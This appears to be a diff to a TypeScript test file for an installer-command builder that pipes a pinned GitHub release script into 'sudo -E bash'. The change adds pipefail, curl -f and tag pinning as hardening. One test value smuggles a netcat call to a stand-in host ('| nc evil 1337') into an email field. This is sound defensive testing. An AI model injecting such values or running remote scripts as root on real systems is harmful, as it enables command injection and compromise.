@@ -8,7 +8,7 @@ import {
 describe("buildInstallCommand", () => {
   it("produces a bare bash -c invocation when no env vars are set", () => {
     const cmd = buildInstallCommand({});
-    expect(cmd).toBe(`bash -c 'curl -sSL ${INSTALL_SCRIPT_URL} | sudo -E bash'`);
+    expect(cmd).toBe(`bash -c 'set -o pipefail; curl -fsSL ${INSTALL_SCRIPT_URL} | sudo -E bash'`);
   });
 
   it("prefixes single-quoted env assignments when values are given", () => {
@@ -19,7 +19,7 @@ describe("buildInstallCommand", () => {
     });
     expect(cmd).toBe(
       `env RELAY_DOMAIN='relay.example.com' TRAEFIK_EMAIL='ops@example.com' APPS_DIR='/root/git' ` +
-        `bash -c 'curl -sSL ${INSTALL_SCRIPT_URL} | sudo -E bash'`,
+        `bash -c 'set -o pipefail; curl -fsSL ${INSTALL_SCRIPT_URL} | sudo -E bash'`,
     );
   });
 
@@ -37,7 +37,7 @@ describe("buildInstallCommand", () => {
     // Proof: the whole command still has exactly one `bash -c '…'`
     // quoted region AFTER the env prefix, meaning the apostrophe
     // injection stays inside the env-value quoting.
-    expect(cmd.endsWith(`bash -c 'curl -sSL ${INSTALL_SCRIPT_URL} | sudo -E bash'`)).toBe(true);
+    expect(cmd.endsWith(`bash -c 'set -o pipefail; curl -fsSL ${INSTALL_SCRIPT_URL} | sudo -E bash'`)).toBe(true);
   });
 
   it("accepts shell metacharacters in values without escaping them at the metachar level", () => {
@@ -53,16 +53,31 @@ describe("buildInstallCommand", () => {
     expect(cmd).toContain(`TRAEFIK_EMAIL='a@b.c | nc evil 1337'`);
   });
 
-  it("pins the installer URL to the hardcoded GitHub raw URL (not caller-configurable)", () => {
+  it("pins the installer URL to a hardcoded release tag (not caller-configurable, never a branch)", () => {
     // Regression guard: if someone ever adds a request-body field for
     // the script URL, this constant check flips red. Redirecting the
     // install to a lookalike script is the most dangerous shape of
-    // this feature and must never become a runtime input.
+    // this feature and must never become a runtime input. The URL names
+    // a release tag through `refs/tags/`, so a push to a branch cannot
+    // change what runs as root on the VPS.
     expect(INSTALL_SCRIPT_URL).toBe(
-      "https://raw.githubusercontent.com/LanNguyenSi/agent-relay/main/install.sh",
+      "https://raw.githubusercontent.com/LanNguyenSi/agent-relay/refs/tags/v0.9.0/install.sh",
+    );
+    expect(INSTALL_SCRIPT_URL).toMatch(
+      /^https:\/\/raw\.githubusercontent\.com\/LanNguyenSi\/agent-relay\/refs\/tags\/v\d+\.\d+\.\d+\/install\.sh$/,
     );
     const cmd = buildInstallCommand({});
     expect(cmd).toContain(INSTALL_SCRIPT_URL);
+  });
+
+  it("fails closed: pipefail and curl -f keep a 404 or a network error from reaching the root shell", () => {
+    const cmd = buildInstallCommand({});
+    expect(cmd).toContain("set -o pipefail;");
+    // -f: an HTTP error status is a curl failure, not a body to execute.
+    expect(cmd).toMatch(/curl -[a-zA-Z]*f[a-zA-Z]* /);
+    // pipefail must be set before the pipeline runs.
+    expect(cmd.indexOf("set -o pipefail")).toBeLessThan(cmd.indexOf("curl"));
+    expect(cmd.indexOf("curl")).toBeLessThan(cmd.indexOf("| sudo -E bash"));
   });
 
   it("emits the v0.2.0 env vars when they are supplied", () => {
